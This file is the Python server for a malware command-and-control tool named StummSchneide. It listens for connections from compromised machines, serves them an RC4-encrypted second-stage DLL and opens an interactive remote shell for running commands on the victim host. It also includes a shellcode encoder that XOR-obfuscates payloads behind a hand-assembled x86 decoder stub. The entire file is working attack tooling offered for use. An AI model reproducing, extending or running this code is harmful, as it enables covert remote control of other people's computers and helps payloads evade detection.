import socket
import struct
import os
import argparse

HOST = "0.0.0.0"
PORT = 4444
DLL_PATH = "payload.dll"
RC4_KEY = b"StummKey2026"

MAGIC_BYTE = 0x53
SENDER_SHELLCODE = 0x01
SENDER_DLL = 0x02

CMD_GET_PAYLOAD = 0x0001
CMD_DLL_HEARTBEAT = 0x0002
CMD_EXEC_CMD = 0x0003

parser = argparse.ArgumentParser(
    description='[*] Server side of StummSchneide',
    epilog='Example: python3 server.py --ip 0.0.0.0 -p 4444 --payload ./payload.dll',
    formatter_class=argparse.RawTextHelpFormatter
)

# C2 server
parser.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
parser.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
parser.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')

# Bad chars
parser.add_argument('-e', '--encode', action='store_true', help=f'XOR bad chars')
parser.add_argument('--input-file', metavar='<INPUT_FILE>', help='Input shellcode file')
parser.add_argument('--output-file', metavar='<OUTPUT_FILE>', help='Output shellcode file')

args = parser.parse_args()

def rc4_crypt(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out_data = bytearray(data)
    for n in range(len(out_data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out_data[n] ^= S[(S[i] + S[j]) % 256]

    return bytes(out_data)

class RC4Stream:
    def __init__(self, key: bytes):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def crypt(self, data: bytes) -> bytes:
        out = bytearray(data)
        for n in range(len(out)):
            self.i = (self.i + 1) % 256
            self.j = (self.j + self.S[self.i]) % 256
            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
            out[n] ^= self.S[(self.S[self.i] + self.S[self.j]) % 256]
        return bytes(out)

def build_stubbed_shellcode(input_path: str, output_path: str, xor_key = 0x5A, bad_chars = None):
    if bad_chars is None:
        bad_chars = [0x00, 0x0a, 0x0d]

    with open(input_path, 'rb') as f:
        raw_shellcode = bytearray(f.read())

    encoded_shellcode = bytearray()
    for b in raw_shellcode:
        encoded_byte = b ^ xor_key

        if encoded_byte in bad_chars:
            print(f'Found bad char: 0x{encoded_byte:02x}')

        encoded_shellcode.append(encoded_byte)

    payload_len = len(encoded_shellcode)

    stub = bytearray([
        0xeb, 0x0e, # jmp short 0x10 (skip call)
        0x5e, # pop esi (ESI = address of shellcode)
        0x31, 0xc9, # xor ecx, ecx
        0x66, 0xb9, payload_len & 0xff, (payload_len >> 8) & 0xff, # mov cx, payload_len

        # XOR decryption loop
        0x80, 0x36, xor_key, # xor byte ptr [esi], xor_key
        0x46, # inc esi
        0xe2, 0xfa, # loop (goto loop)
        0xeb, 0x05, # jmp encoded_shellcode
        0xe8, 0xed, 0xff, 0xff, 0xff, # call pop_esi
    ])

    for bc in bad_chars:
        if bc in stub:
            print(f'[-] Error: Decoder Stub contains bad char: 0x{bc:02x}')
            return

    final_payload = stub + encoded_shellcode

    with open(output_path, 'wb') as f:
        f.write(final_payload)

    print(f'[+] Built stubbed shellcode binary file successfully')
    print(f'[+] Stub: {len(stub)} bytes')
    print(f'[+] payload: {payload_len} bytes')
    print(f'[+] stubbed: {len(final_payload)} bytes')

def do_cmd(conn: socket.socket):
    while True:
        try:
            cmd_input = input("StummSchneide-Shell> ").strip()
            if not cmd_input:
                continue
            if cmd_input.lower() in ["exit", "quit"]:
                break

            cmd_bytes = cmd_input.encode('utf-8')
            data_len = len(cmd_bytes)
            
            cipher = RC4Stream(RC4_KEY)
            encrypted_cmd = cipher.crypt(cmd_bytes)

            pkt_header = struct.pack("<BBHI", MAGIC_BYTE, SENDER_DLL, CMD_EXEC_CMD, data_len)
            conn.sendall(pkt_header + encrypted_cmd)

            resp_len_bytes = conn.recv(4)
            if not resp_len_bytes or len(resp_len_bytes) < 4:
                print("[-] Connection lost.")
                break
            
            resp_len = struct.unpack("<I", resp_len_bytes)[0]
            
            resp_data = b""
            while len(resp_data) < resp_len:
                chunk = conn.recv(resp_len - len(resp_data))
                if not chunk:
                    break
                resp_data += chunk

            dec_cipher = RC4Stream(RC4_KEY)
            dec_data = dec_cipher.crypt(resp_data)

            try:
                print(dec_data.decode('cp950', errors='ignore'))
            except:
                print(dec_data.decode('utf-8', errors='ignore'))

        except Exception as e:
            print(f"[-] Terminal error: {e}")
            break

def do_interactive(conn: socket.socket):
    module = {
        'cmd' : do_cmd,
        'exit': '',
    }

    while True:
        print('Available module(s):')
        for i in module.keys():
            print(f'- {i}')
    
        option = input('Enter module: ')
        if option not in module.keys():
            print(f'[!] Unknown module: {option}')
            continue

        if option == 'exit':
            conn.close()
            break

        module[option](conn)

def main():
    if args.encode:
        if not (args.input_file and args.output_file):
            return
        
        build_stubbed_shellcode(args.input_file, args.output_file)
        return

    if not os.path.exists(args.payload):
        print('[-] Payload file not found: ' + args.payload)
        return

    with open(args.payload, "rb") as f:
        dll_bytes = f.read()

    dll_bytes = rc4_crypt(RC4_KEY, dll_bytes)
    dll_len = len(dll_bytes)
    print(f"[*] Loaded payload.dll: {dll_len} bytes")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.ip, args.port))
        srv.listen(5)
        print(f"[*] Listening on {args.ip}:{args.port} (RC4)...")

        while True:
            conn, addr = srv.accept()
            try:
                header_peek = conn.recv(8, socket.MSG_PEEK)
                if len(header_peek) < 8:
                    conn.close()
                    continue

                magic, sender, command, _ = struct.unpack("<BBHI", header_peek[:8])

                if magic != MAGIC_BYTE:
                    conn.close()
                    continue

                if sender == SENDER_SHELLCODE:
                    header = conn.recv(8)
                    _, _, cmd, _ = struct.unpack("<BBHI", header)
                    print(f"[+] Connection from {addr} [Stage 1 (Shellcode)]")
                    if cmd == CMD_GET_PAYLOAD:
                        conn.sendall(struct.pack("<I", dll_len))
                        conn.sendall(dll_bytes)
                        print(f"[+] Sent {dll_len} bytes of encrypted payload.")
                    conn.close()

                elif sender == SENDER_DLL:
                    print(f"[+] Connection from {addr} [Stage 2 (DLL payload)]")
                    header = conn.recv(8)
                    _, _, dll_cmd, _ = struct.unpack("<BBHI", header)
                    
                    if dll_cmd == CMD_DLL_HEARTBEAT:
                        print(f"[+] Received DLL heartbeat header.")
                        print('------------------------------')
                        print('----------[ Pwned ]-----------')
                        print('------------------------------')

                        do_interactive(conn)

            except Exception as e:
                print(f"[-] Error handling connection from {addr}: {e}")
                conn.close()

if __name__ == "__main__":
    main()